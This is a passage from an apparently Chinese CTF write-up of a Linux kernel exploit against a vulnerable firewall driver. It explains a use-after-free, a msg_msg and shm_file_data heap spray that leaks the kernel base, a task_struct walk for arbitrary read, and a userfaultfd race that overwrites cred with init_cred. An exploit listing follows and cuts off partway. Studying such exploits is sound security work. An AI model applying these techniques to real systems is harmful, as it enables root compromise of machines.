</blockquote>
<p>知道了上面区域的一些地址就可以知道内核的基地址了。在这道题中选择使用<code>shm_file_data</code>结构体来泄露内核data段地址进而知道内核基地址。其中<code>ipc_namespace</code>就指向内核data段。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shm_file_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">int</span> id;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm_operations_struct</span> *<span class="title">vm_ops</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>泄露地址可以分为一下几步</p>
<ul>
<li>1.首先构造一个4kb的uaf然后申请一个<code>0xfd8</code>大小的<code>msg_msg</code>，此时<code>msg</code>结构体如下图</li>
</ul>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20221017001913589.png" alt="image-20221017001913589"></p>
<ul>
<li>2.堆喷，这样<code>shm_file_data</code>就可能落到<code>struct msg_msg</code>下面了</li>
<li>3.利用<code>uaf</code>修改<code>m_ts</code>，这个变量记录了这个消息的大小，改大之后再<code>MSG_COPY</code>这个消息队列就可以可以得到<code>struct msg_msg</code>后面的堆的信息了，也就得到了内核基地址。</li>
<li>4.利用基地址就可以算出<code>init_cred</code>和<code>init_task</code>了，这两个结构体都在内核data段中，可以直接算出。</li>
</ul>
<p>得到上面的地址就可以利用<code>init_task</code>来找到这个进程的<code>task_struct</code>了。</p>
<p>每个进程都有一个<code>task_struct</code>，内核使用双向循环表来组织这个结构体，字段为<code>struct list_head        tasks;</code></p>
<p>结构体如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>所以可以通过<code>init_task</code>的<code>prev</code>向上寻找，直到找到这个进程的<code>task_struct</code>。</p>
<p>说白了就是通过修改<code>msg</code>的<code>next</code>字段完成任意读操作，关键是如何构造<code>msg</code>了，下面是作者给出的构造示意图，我也是按照这个进行构造的，我们得覆盖<code>next</code>让其指向<code>task_struct</code>的某一个地方，然后再读这个<code>task_struct</code>，但是对<code>next</code>的覆盖是有要求的，他所指向的地址的前八个字节必须为空，不然读取和写入的时候就会报错，具体原因看看源码就懂了。</p>
<p>其中<code>struct list_head        tasks</code>在位于<code>task_struct</code>的0x298偏移出，其前八个字节刚好是<code>null</code>,所以可以让<code>next</code>指向<code>task_struct_addr+0x290</code>处。这样就可以读到<code>task_struct</code>的<code>prev</code>和<code>pid</code>了，pid位于<code>task_struct</code>的0x398处，然后整一个循环读到当前进程的<code>task_struct</code>了。</p>
<p><img src="https://1.bp.blogspot.com/-Y-YqvmgaX1U/YSggQhwb5pI/AAAAAAAACIc/leKw-FMmY_8TuX-rqv_H0Get2kT3NFEEACLcBGAsYHQ/w640-h426/3.png" alt="img"></p>
<p>注意<code>prev</code>并不指向上一个进程的<code>task_struct</code>的开头，而是指向其中的字段<code>struct list_head tasks</code>，所以减去0x298就得到当前<code>task_struct</code>的基地址了。</p>
<p>得到当前进程<code>task_struct</code>的基地址后就得构造任意地址写来完成对当前进程<code>task_struct</code>中的<code>real_cred 和 cred</code>指针的覆写，覆写成<code>init_cred</code>指针。</p>
<p>首先考虑<code>msg</code>的<code>next</code>应该指向哪里，<code>read_cred</code>和<code>cred</code>对于<code>task_struct</code>的偏移是0x538和0x540。<code>real_cred</code>的前八个字节刚好还是<code>null</code>,所以可以让<code>next</code>指向<code>task_struct+0x538-0x8</code>.</p>
<p><img src="https://1.bp.blogspot.com/-MhE76o_slr0/YSfwYpL-e-I/AAAAAAAACIQ/-ThXZ-1XlH4-hQJzKbxsJazF73c8g_SWQCLcBGAsYHQ/w640-h402/4.png" alt="img"></p>
<p>只要考虑清楚<code>next</code>的的取值问题，任意地址写就是套<code>userfaulted</code>的板子了,步骤如下</p>
<ul>
<li>先mmap一段ox2000的内存，然后在0x1000-0x8处填上mtype,把0x1000注册缺页处理，然后<code>send_msg(msg_id, msg_buff, size - 0x30, 0);</code></li>
<li>当msg进入缺页处理函数的时候，准备好<code>page</code>,其<code>0xfd0</code>和<code>0xfd8</code>处准备好<code>init_cred</code>，然后利用设备的edit修改<code>msg</code>的next指针</li>
</ul>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;byteswap.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/timerfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/reboot.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADD_RULE 0x1337babe</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DELETE_RULE 0xdeadbabe</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EDIT_RULE 0x1337beef</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHOW_RULE 0xdeadbeef</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DUP_RULE 0xbaad5aad</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO_API 0xc018aa3f</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO_REGISTER 0xc020aa00</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO_UNREGISTER 0x8010aa01</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO_COPY 0xc028aa03</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO_ZEROPAGE 0xc020aa04</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO_WAKE 0x8010aa02</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INBOUND 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OUTBOUND 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SKIP -1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *page;</span><br><span class="line"><span class="keyword">size_t</span> page_size;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DESC_MAX 0x800</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> iface[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> ip[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> netmask[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> idx;</span><br><span class="line">    <span class="keyword">uint8_t</span> type;</span><br><span class="line">    <span class="keyword">uint16_t</span> proto;</span><br><span class="line">    <span class="keyword">uint16_t</span> port;</span><br><span class="line">    <span class="keyword">uint8_t</span> action;</span><br><span class="line">    <span class="keyword">char</span> desc[DESC_MAX];</span><br><span class="line">&#125; User_rule_t;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> iface[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">uint32_t</span> ip;</span><br><span class="line">    <span class="keyword">uint32_t</span> netmask;</span><br><span class="line">    <span class="keyword">uint16_t</span> proto;</span><br><span class="line">    <span class="keyword">uint16_t</span> port;</span><br><span class="line">    <span class="keyword">uint8_t</span> action;</span><br><span class="line">    <span class="keyword">uint8_t</span> is_duplicated;</span><br><span class="line">    <span class="keyword">char</span> desc[DESC_MAX];</span><br><span class="line">&#125; Rule_t;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="keyword">long</span> mtype;</span><br><span class="line">        <span class="keyword">char</span> mtext[<span class="number">1</span>];</span><br><span class="line">&#125;msg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *ll_next;</span><br><span class="line">    <span class="keyword">void</span> *ll_prev;</span><br><span class="line">    <span class="keyword">long</span> m_type;</span><br><span class="line">    <span class="keyword">size_t</span> m_ts;</span><br><span class="line">    <span class="keyword">void</span> *next;</span><br><span class="line">    <span class="keyword">void</span> *security;</span><br><span class="line">&#125;msg_header;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> target_addr=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> init_cred_addr=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> fd=<span class="number">0</span>;</span><br><span class="line">err_exit(<span class="keyword">char</span> *buf)&#123;</span><br><span class="line">    <span class="built_in">puts</span>(buf);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ioctl</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">unsigned</span> <span class="keyword">long</span> request, <span class="keyword">unsigned</span> <span class="keyword">long</span> param)</span> <span class="comment">//ioctl wrapper</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ioctl\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_ioctl, fd, request, param);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">pthread_t</span> monitor_thread;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">registerUserFaultFd</span><span class="params">(<span class="keyword">void</span> * addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">void</span> (*handler)(<span class="keyword">void</span>*))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    <span class="keyword">int</span> s;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create and enable userfaultfd object */</span></span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>)</span><br><span class="line">        err_exit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)</span><br><span class="line">        err_exit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_register.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) addr;</span><br><span class="line">    uffdio_register.range.len = len;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>)</span><br><span class="line">        err_exit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">    s = pthread_create(&amp;monitor_thread, <span class="literal">NULL</span>, handler, (<span class="keyword">void</span> *) uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">        err_exit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">fault_handler_thread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="keyword">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="keyword">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="keyword">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="built_in">memset</span>(page,<span class="number">0</span>,page_size);</span><br><span class="line">        <span class="built_in">memcpy</span>(page+ <span class="number">0x1000</span><span class="number">-0x30</span>,&amp;init_cred_addr,<span class="number">8</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(page+ <span class="number">0x1000</span><span class="number">-0x30</span>+<span class="number">8</span>,&amp;init_cred_addr,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">        msg_header fake_msg_header;</span><br><span class="line">        fake_msg_header.ll_next=(<span class="keyword">void</span> *)<span class="number">0x4141414141414141</span>;</span><br><span class="line">        fake_msg_header.ll_prev=(<span class="keyword">void</span> *)<span class="number">0x4242424242424242</span>;</span><br><span class="line">        fake_msg_header.m_ts=<span class="number">0x1000</span><span class="number">-0x30</span>+<span class="number">0x8</span>;</span><br><span class="line">        fake_msg_header.next=target_addr;</span><br><span class="line">        fake_msg_header.m_type=<span class="number">1</span>;</span><br><span class="line">        edit_rule(fd,&amp;fake_msg_header,<span class="number">1</span>,OUTBOUND,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            err_exit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                                              ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usr_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;getshelling&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]----getshell ok&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] getshell fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 